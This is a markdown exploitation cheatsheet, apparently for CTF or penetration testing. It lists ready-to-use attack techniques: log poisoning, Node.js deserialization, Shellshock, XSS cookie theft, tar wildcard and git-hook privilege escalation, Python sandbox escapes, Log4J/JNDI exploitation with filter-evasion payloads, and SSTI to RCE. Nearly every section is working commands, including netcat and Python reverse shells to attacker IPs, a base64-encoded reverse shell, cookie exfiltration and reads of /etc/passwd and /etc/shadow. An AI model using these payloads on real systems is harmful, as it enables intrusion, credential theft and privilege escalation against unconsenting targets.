# Exploitation cheatsheet

## Summary
* [Tools for Java platforms](#tools-for-testing-vulnerabilities-in-java-platforms)
* [Log poisoning](#log-poisoning-for-reverse-shell)
* [Firefox config file](#get-information-from-firefox-config-file)
* [Python module hijacking](#python-module-hijacking)
* [Node.JS deserialization](#node.js-deserialization-exploitation)
* [Node.JS replace error](#node.js-replace-error-exploitation)
* [PHP deserialization](#php-deserialization-exploitation)
* [Shellshock](#shellshock-exploitation)
* [Steal cookies with XSS](#steal-user-cookies-with-xss)
* [Tar wildcard](#tar-wildcard-privilege-escalation)
* [Rate limit bypass](#rate-limit-bypass)
* [Bypass blacklisted words with Python](#bypass-blacklisted-words-with-built-in-modules-in-python)
* [Change file owner with Python](#change-file-owner-with-python)
* [Exploiting Python input functions](#exploiting-python-input-functions)
* [Verify Log4J](#verify-if-an-application-is-vulnerable-to-log4j)
* [Exploiting Log4J - Exploit 1](#exploiting-log4j-vulnerability---exploit-1)
* [Exploiting Log4J - Exploit 2](#exploiting-log4j-vulnerability---exploit-2)
* [JNDI payload bypass](#jndi-payload-bypass)
* [Exploiting SSTI](#exploiting-server-side-template-injection)
* [Exploiting SSTI for RCE](#exploiting-server-side-template-injection-for-rce)
* [Replacing system's file](#replacing-file-with-customized-file-with-file-upload)
* [Abusing Git hooks](#abusing-git-hooks)
* [Read system files with race condition](#read-unauthorized-system-files-with-race-condition)
* [Exploiting logrotate](#exploiting-logrotate-to-gain-privilege)
* [Extract data from pdf via json injection](#extract-data-from-pdf-via-json-injection)

### Tools for testing vulnerabilities in Java platforms
#### https://github.com/joaomatosf/jexboss

### Log poisoning for reverse shell
```
> Confirm the path of log files (apache2 - /var/log/apache2/access.log
> Intercept request of the web page that is vulnerable to LFI

> Add { <?php passthru($_GET['cmd']); ?> } in user agent
                      OR
> Add <?php file_put_contents('reverse.php', file_get_contents('[url+reverse.php]')); ?> in user agent
                      OR
> Use exploit/multi/script/web_delivery on metasploit to craft a simple payload

> Request the url to read the log file and include "cmd" parameter to execute commands
> Execute wget command to download php reverse shell from local machine
> Execute the php reverse shell while the listener is up
```

### Get information from Firefox config file
```
> Compress firefox config file and download to local machine
> python3 firefox-decrypt.py [file name]
> Get possible credential stored inside
```

### Python module hijacking
```
> Example: python3 -c 'import compare;print(compare.str("hello", "hello))
> Exploit: echo "python3 -c 'import os;os.system("/bin/bash")'" > /tmp/compare.py && export PYTHONPATH="/tmp"
```

### Node.JS deserialization exploitation
```
> Use nodejsshell.py to create a payload & {"rce":"_$$ND_FUNC$$_function (){ [PUT THE PAYLOAD HERE!!!!]}()"}
> Intercept the vulnerable website page with burpsuite
> Encode the payload created into base64
> Replace the encoded payload with the cookies in the intercepted website page in burpsuite
> Set up a listener
> Example: {"email":"test@test.com","rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.231 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) }); }()"}
```

### Node.JS replace error exploitation
```
Means that the site is expecting a parameter & if there is a parameter, see if it is injectable
```

### PHP deserialization exploitation
#### https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection

### Shellshock exploitation
```
> Find the attack vector for shellshock exploit to be successful e.g --> cgi-bin script
> curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" "http://ip/cgi-bin/test.cgi" 
> Execute reverse shell command to get reverse shell
```

### Steal user cookies with XSS vulnerability
```
> php -S 127.0.0.1:8080
> Exploit: <svg onload='var x = document.createElement("IFRAME");x.setAttribute("src", "http://10.4.64.135:8080/cookie?"+document.cookie);document.body.appendChild(x);''/>
```

### Tar wildcard privilege escalation
```
> echo '/bin/bash -c "/bin/bash"' > shell.sh
> chmod +x shell.sh
> echo "" > "--checkpoint-action=exec.sh shell.sh"
> echo "" > --checkpoint=1
> tar cf archive.tar *
```

### Rate limit bypass
Add below headers to the HTTP request
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
```
Use burpsuite or wfuzz to bruteforce POST HTTP data
```
wfuzz -c -z file,numbers.txt -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Host: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -d "number=FUZZ" --hw 81 http://example.com:80/
```

### Bypass blacklisted words with built-in modules in Python
```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
```

### Change file owner with Python
```
python3 -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

### Exploiting Python input functions
#### https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
input the following command into python input()
```
__import__('os').system('nc -e /bin/bash 10.4.64.135 4444')
```

### Verify if an application is vulnerable to Log4J
setup a listener
```
nc -lvnp 4444	
```
Find a location where you can supply JNDI syntax e.g -- url parameter & http headers
```
curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:4444\}'
> the server will then try to connect to the ip address on port 4444 if there is a log4j vulnerability
```

### Exploiting Log4J vulnerability - Exploit 1
Starts a ldap server
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS/#Exploit"
```
Create a java exploit code as follow and save it as Exploit.java
```
public class Exploit {
  static {
    try {
      java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.4.64.135 4444");
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
 }

> Compile Exploit.java with 'javac Exploit.java'
> Start a listener on port 4444
> Host the payload on a http.server
```
Finally trigger the exploit by firing off the JNDI syntax
```
curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:1389/Exploit\}'
curl http://example.com/ -H 'X-Api-Version: ${jndi:ldap://10.4.64.135:1389/Exploit}'
```
The attack sequence is as follow
```
> Once the JNDI syntax is executed, it first connects to ldap server which will redirect to a http server
> The http server will host a java payload with contains a reverse shell script
> The vulnerable machine will execute the java payload and that will result us a reverse shell
```

### Exploiting Log4J vulnerability - Exploit 2
Run JNDI-Exploit-Kit
```
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.4.64.135:1389" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC40LjY0LjEzNSA5OTk5ID4vdG1wL2Y= | base64 -d | bash"
```
Set up a listener accordingly
Trigger the exploit by firing off the JNDI syntax with the URL provided by JNDI-Exploit-Kit
```
curl http://example.com/ -H 'X-Api-Version: ${jndi:ldap://10.4.64.135:1389/vct1ie}'
curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:1389/vctlie}'
```

### JNDI payload bypass
```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}
```

### Exploiting Server Side Template Injection
```
http://example.com/404.page{{7+7}}
http://example.com/404.page{{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Exploiting Server Side Template Injection for RCE
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("ping 10.10.1.10")}
```

### Replacing file with customized file with file upload
```
> Example.com has a file upload functionality where we can upload any file but we cant trigger any kind of that files
> Assume we know the application has enabled debugger which means that the application will update its sources to any changes
> The application's config file is views.py in /app/app directory on the server
> Customized the views.py and upload it, then intercept the request
> In the intercepted request, change the file name to /app/app/views.py (absolute path so that the application will not ignore it) because we want to replace the original views.py in /app/app directory on the server instead of uploading the file to /uploads directory on the server
```

### Abusing GIT hooks
Any Git repo has a .git directory and one of the folders is hooks by default it has a bunch of .sample files however hooks will skip .sample files but not the others we can exploit this by writing a bash script with a regular name without .sample extension inside hooks directory
```
> echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
> chmod +x pre-commit
```
The exploit copy /bin/bash into /tmp/0xdf, change owner to root and sets it to SUID when someone tries to commit, pre-commit file will run

### Read unauthorized system files with race condition
Assume there is a file that disallow unauthorized user to read it. Unauthorized user can read the file with race condition exploitation.
First upload this .c file into the target machine
```
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}

> The code above constantly exchange names between 2 files
> Since the script will run constantly, we can read the file because the file cant keep up with the constant name changes and therefore raise the race condition vulnerability
```
Compile the .c script and run it with 2 files as the arguments
```
> gcc rename.c -o rename
> ./rename secret_file_to_read random_file
```
Now while the rename script keeps running, we can try to read the secret_file_to_read

### Exploiting logrotate to gain privilege
To exploit this, you will need to meet 3 conditions:
- Logrotate has to be executed as root
- The logpath needs to be in control of the attacker
- Any option that creates files is set in the logrotate configuration

```
Download .c file from https://github.com/whotwagner/logrotten
Compile the .c file and give executable permission to the compiled file
Execute the executable file
```

### Extract data from pdf via json injection
Assume an app allows you to add products to cart and purchasing them, get a pdf file containing a summary of your purchased items.

If you are in luck and able to manipulate the json data that will appear in the pdf file, you might be able to extract files from system machines.
```
{"basket":[{
  "_id":"638f116eeb060210cbd83a8d",
  "title":"<iframe src=file:///etc/passwd </iframe>",
  "description":"It's a red cup.",
  "image":"red-cup.jpg",
  "price":32,"currentStock":4,
  "__v":0,
  "amount":10000000000
}]}
```
The payload uses iframe to display the file "/etc/passwd".
